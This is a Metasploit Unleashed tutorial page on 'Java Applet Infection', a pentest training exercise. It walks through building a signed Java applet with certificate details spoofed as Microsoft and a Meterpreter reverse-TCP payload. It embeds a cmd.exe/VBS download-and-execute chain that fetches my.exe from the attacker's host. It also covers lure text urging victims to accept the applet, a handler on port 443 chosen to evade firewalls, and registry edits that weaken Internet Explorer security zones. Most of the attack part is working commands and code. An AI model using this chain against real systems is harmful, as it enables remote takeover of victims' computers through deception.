<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Java Applet Infection</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Java
Applet Infection</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Joshua Abraham (jabra) published a
great article which was based on
a talk given at the Infosec World Conference with Rafal Los and can be
found at <a href="http://blog.spl0it.org" class="external free"
 rel="nofollow">http://blog.spl0it.org</a>.
Essentially, what the two were able to do is build a java applet that
once executed in a browser will actually allow us to execute a
Meterpreter payload if the target accepts the security warning.
</p>
<p style="color: rgb(0, 0, 0);">Before we dive into this we need to
meet some prerequisites on our attackers machine before we begin.
<br>
<br>
</p>
<pre id="code">root@bt4:/# apt-get install sun-java6-jdk</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Jabra has simplified most of the
process with the bash script below to reduce input errors. You can
download this script at: </span><a style="color: rgb(0, 0, 0);"
 href="http://spl0it.org/files/makeapplet.sh" class="external free"
 rel="nofollow">http://spl0it.org/files/makeapplet.sh</a>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">#!/bin/bash<br>#<br># Shell script to sign a Java Applet<br># Joshua "Jabra" Abraham <br># Tue Jun 30 02:26:36 EDT 2009<br>#<br># 1. Compile the Applet source code to an executable class.<br>#<br># javac HelloWorld.java<br>#<br># 2. Package the compiled class into a JAR file.<br>#<br># jar cvf HelloWorld.jar HelloWorld.class<br>#<br># 3. Generate key pairs.<br>#<br># keytool genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mystorepass<br>#<br># 4. Sign the JAR file.<br>#<br># jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass - signedjar SignedHelloWorld.jar<br># HelloWorld.jar signapplet<br>#<br># 5. Export the public key certificate.<br>#<br># keytool -export -keystore mykeystore -storepass mystorepass -alias signapplet -file mycertificate.cer<br>#<br># 6. Deploy the JAR and the class file.<br>#<br># &lt;applet code="HelloWorld.class" archive="SignedHelloWorld.jar" width=1 height=1&gt; &lt;/applet&gt;<br>#<br>echo "Enter the name of the applet without the extension:"<br>read NAMEjavac $NAME.javaif [ $? -eq 1 ] ; then<br>echo "Error with javac"<br>exit<br>fi<br><br>echo "[+] Packaging the compiled class into a JAR file"<br>jar cf $NAME.jar $NAME.class<br>if [ $? -eq 1 ] ; then<br>echo "Error with jar"<br>exit<br>fi<br><br>echo "[+] Generating key pairs"<br>keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass mystorepass<br>if [ $? -eq 1 ] ; then<br>echo "Error with generating the key pair"<br>exit<br>fi<br><br>echo "[+] Signing the JAR file"<br>jarsigner -keystore mykeystore -storepass mystorepass -keypass mykeypass -signedjar "Signed$NAME.jar" $NAME.jar signapplet<br>if [ $? -eq 1 ] ; then<br>echo "Error with signing the jar"<br>exit<br>fi<br><br>echo "[+] Exporting the public key certificate"<br>keytool -export -keystore mykeystore -storepass mystorepass -alias signapplet -file mycertificate.cer<br>if [ $? -eq 1 ] ; then<br>echo "Error with exporting the public key"<br>exit<br>fi<br>echo "[+] Done"<br>sleep 1<br>echo ""<br>echo ""<br>echo "Deploy the JAR and certificate files. They should be deployed to a directory on a Web server."<br>echo ""<br>echo "&lt;applet width='1' height='1' code='$NAME.class' archive='Signed$NAME.jar'&gt; "<br>echo ""</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will now make a working directory
for us to store this file and
then grab it from his site or copy and paste it into your favorite text
editor.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/# mkdir ./java-applet<br><br>root@bt4:/# cd ./java-applet</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We need to make a java applet which
we will then sign. For this, we
will copy and paste the text below into your favorite text editor and
save it as&nbsp;: "MSFcmd.java". For the remainder of this module,
leave
your editor open as you will need to modify some parameters as we go
along with this module.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">import java.applet.*;<br>import java.awt.*;<br>import java.io.*;<br>public class MSFcmd extends Applet {<br>public void init() {<br>Process f;<br>String first = getParameter("first");<br>try {<br>f = Runtime.getRuntime().exec("first");<br>}<br>catch(IOException e) {<br>e.printStackTrace();<br>}<br>Process s;<br>}<br>}</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Next, we will use Jabras shell
script to aid us in making our
certificate. The following command will download the script, make it
executable, and then launch the script to produce the certs.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/java-applet/# wget http://spl0it.org/files/makeapplet.sh &amp;&amp; chmod a+x ./makeapplet.sh<br><br>root@bt4:/java-applet/# ./makeapplet.sh<br><br>Enter the name of the applet without the extension: MSFcmd<br>[+] Packaging the compiled class into a JAR file<br>[+] Generating key pairs<br>What is your first and last name? [Unknown]: MSFcmd<br>What is the name of your organizational unit? [Unknown]: Microsoft<br>What is the name of your organization? [Unknown]: Microsoft Organization<br>What is the name of your City or Locality? [Unknown]: Redmond<br>What is the name of your State or Province? [Unknown]: Washington<br>What is the two-letter country code for this unit? [Unknown]: US<br>Is CN=MSFcmd, OU=Microsoft, O=Microsoft Organization, L=Redmond, ST=Washington, C=US correct? [no]: yes<br><br>[+] Signing the JAR file<br><br>Warning:<br>The signer certificate will expire within six months.<br>[+] Exporting the public key certificate<br>Certificate stored in file<br>[+] Done<br></pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that everything is setup for us,
we need to deploy the JAR and the class file.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/java-applet/# cp SignedMSFcmd.jar /var/www/<br><br>root@bt4:/java-applet/# cp MSFcmd.class /var/www/<br><br>root@bt4:/java-applet/# apache2ctl start</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that the applet is deployed, we
will have to create a
Meterpreter payload. Change 'X.X.X.X' in the examples below to match
your Attackers IP address. This command uses msfpayload to create a
Reverse TCP Meterpreter Shell with our victim. We generate this payload
in Raw format and pipe it into msfencode, saving the payload as an
executable. The executable is then copied to our web root directory and
made executable.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3/# ./msfpayload windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 R | ./msfencode -t exe -o my.exe<br><br>root@bt4:/pentest/exploits/framework3/# cp ./my.exe /var/www/<br><br>root@bt4:/pentest/exploits/framework3/# chmod a+x /var/www/my.exe</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now we need to add a command into
our index.html file which will
allow the client to download and execute our payload. Basically, this
page will launch a java applet signed by ourselves, which, when given
permission by the client, will then call cmd.exe from their system,
echoing lines into a vbs script named "apsou.vbs". Be forewarned that
this file can be found on the system after all successful and "some"
failed attempts. After this file is created, the same command string
launches the vbs script and feeds it a variable, the attackers link to
the payload "my.exe". Once the payload has been downloaded it will then
execute my.exe with that users permissions.
</span>
<p style="color: rgb(0, 0, 0);">We need to modify our index.html page
which our clients will view.
In a real world scenario, a pentester might try adding some video, web
browser games, or other activities to distract or entertain the victim.
Clever trickery such as Social Engineering can greatly benefit this
type of attack by directing your targets to a specific URL and telling
them to accept the security warning to continue viewing your site or
use your "Custom Secure IM applet". You can also have different
payloads in different folders waiting for different clients.
</p>
<p style="color: rgb(0, 0, 0);">Enter the command below as one
continuous line and be sure to change 'X.X.X.X' to your attacking IP
address.
<br>
<br>
</p>
<pre id="code">root@bt4:/pentest/exploits/framework3/# echo "&lt;applet width='1' height='1' code='MSFcmd.class' archive='SignedMSFcmd.jar'&gt;" &gt; /var/www/index.html<br><br>root@bt4:/pentest/exploits/framework3/# echo "&lt;param name='first' value='cmd.exe /c echo Const adTypeBinary = 1 &gt; \<br>C:\windows\apsou.vbs &amp; echo Const adSaveCreateOverWrite = 2 &gt;&gt; C:\windows\apsou.vbs \<br>&amp; echo Dim BinaryStream &gt;&gt; C:\windows\apsou.vbs &amp; echo Set BinaryStream = CreateObject("ADODB.Stream") &gt;&gt; \<br>C:\windows\apsou.vbs &amp; echo BinaryStream.Type = adTypeBinary &gt;&gt; C:\windows\apsou.vbs &amp; \<br>echo BinaryStream.Open &gt;&gt; C:\windows\apsou.vbs &amp; echo BinaryStream.Write BinaryGetURL(Wscript.Arguments(0)) &gt;&gt; \<br>C:\windows\apsou.vbs &amp; echo BinaryStream.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite &gt;&gt; \<br>C:\windows\apsou.vbs &amp; echo Function BinaryGetURL(URL) &gt;&gt; C:\windows\apsou.vbs &amp; echo Dim Http &gt;&gt; \<br>C:\windows\apsou.vbs &amp; echo Set Http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; C:\windows\apsou.vbs &amp; \<br>echo Http.Open "GET", URL, False &gt;&gt; C:\windows\apsou.vbs &amp; echo Http.Send &gt;&gt; C: windows\apsou.vbs &amp; \<br>echo BinaryGetURL = Http.ResponseBody &gt;&gt; C:\windows\apsou.vbs &amp; echo End Function &gt;&gt; C:\windows\apsou.vbs &amp; \<br>echo Set shell = CreateObject("WScript.Shell") &gt;&gt; C:\windows\apsou.vbs &amp; echo shell.Run "C:\windows\my.exe" &gt;&gt; \<br>C:\windows\apsou.vbs &amp; start C:\windows\apsou.vbs http://X.X.X.X/my.exe C:\windows\my.exe'&gt; &lt;/applet&gt;" &gt;&gt; \<br>/var/www/index.html</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will also add a message prompting
the user to accept our malicious applet.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3/# echo "" &gt;&gt; /var/www/index.html<br><br>root@bt4:/pentest/exploits/framework3/# echo "Please wait. We appreciate your business. This process may take a while." &gt;&gt; /var/www/index.html<br><br>root@bt4:/pentest/exploits/framework3/# echo "To view this page properly you must accept and run the applet.<br>We are sorry for any inconvenience. " &gt;&gt; /var/www/index.html</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We now need to setup the Metasploit
multi/handler to listen for
connection attempts from the clients. We will be listening for a
reverse shell from the target on port 443. This port is associated with
HTTPS traffic and most organizations firewalls permit this internal
traffic leaving their networks. As before, change the 'X.X.X.X' to your
attackers IP address.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; use exploit/multi/handler<br>msf exploit(handler) &gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(handler) &gt; set LHOST X.X.X.X<br>LHOST =&gt; X.X.X.X<br>msf exploit(handler) &gt; set LPORT 443<br>LPORT +&gt; 443<br>msf exploit(handler) &gt; save<br>Saved configuration to: /root/.msf3/config<br>msf exploit(handler) &gt; exploit -j<br>[*] Exploit running as background job.<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">When a victim browses to our website
and accepts the security
warning, the Meterpreter payload runs and connects back to our handler.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"> msf exploit(handler) &gt;<br> [*] Sending stage   (718336 bytes)<br> [*] Meterpreter session 1 opened (A.A.A.A:443 -&gt; T.T.T.T:44477)<br> msf exploit(handler) &gt; sessions -i 1<br> [*] Starting interaction with 1...<br><br> <u>meterpreter</u> &gt; ps<br><br> Process list<br>============<br><br>     PID   Name           Path<br>     ---   ----           ----<br>     204   jusched.exe    C:\ProgramFiles\Java\jre6\bin\jusched.exe<br>     288   ctfmon.exe     C:\WINDOWS\system32\ctfmon.exe<br>     744   smss.exe       \SystemRoot\System32\smss.exe<br>     912   winlogon.exe     C:\WINDOWS\system32\winlogon.exe<br>     972   services.exe   C:\WINDOWS\system32\services.exe<br>     984   lsass.exe      C:\WINDOWS\system32\lsass.exe<br>     1176  svchost.exe    C:\WINDOWS\system32\svchost.exe<br>     1256  java.exe       C:\Program Files\Java\jre6\bin\java.exe<br>     1360    svchost.exe    C:\WINDOWS\System32\svchost.exe<br>     1640  spoolsv.exe    C:\WINDOWS\system32\spoolsv.exe<br>     1712  Explorer.EXE   C:\WINDOWS\Explorer.EXE<br>     1872  jqs.exe        C:\Program Files\Java\jre6\bin\jqs.exe<br>     2412  my.exe         C:\windows\my.exe<br>     3052  iexplore.exe     C:\Program Files\Internet Explorer\iexplore.exe<br><br> <u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As a final note if you have troubles
gaining access, ensure that the files
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">'C:\windows\apsou.vbs'</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">and
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">'C:\windows\my.exe'</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">DO NOT exist on your target.
</span>
<p style="color: rgb(0, 0, 0);">If you attempt to re-exploit this
client you will not be able to properly launch the vbs script.
</p>
<p style="color: rgb(0, 0, 0);">If you are still experiencing problems
and you have ensured the files above are not on the system,
please check the following locations in the registry and make changes
as needed.
<br>
<br>
</p>
<pre id="code">Start &gt; run : regedit<br><br>navigate to:<br>HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Security_HKLM_only<br><br>change value to: 0<br><br>navigate to:<br>HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\Flags<br><br>click Decimal<br>change value to 3<br><br>navigate to:<br>HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\<br><br>make new dword with the name 1C00<br>value in hex 10000<br><br>navigate to:<br>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\Flags<br><br>click Decimal<br>change value to 3</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now we should close regedit and
start or restart IE and the new settings should apply.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Client_Side_Exploits"
 title="Client Side Exploits">Client-Side Exploits</a></div>
</body>
</html>
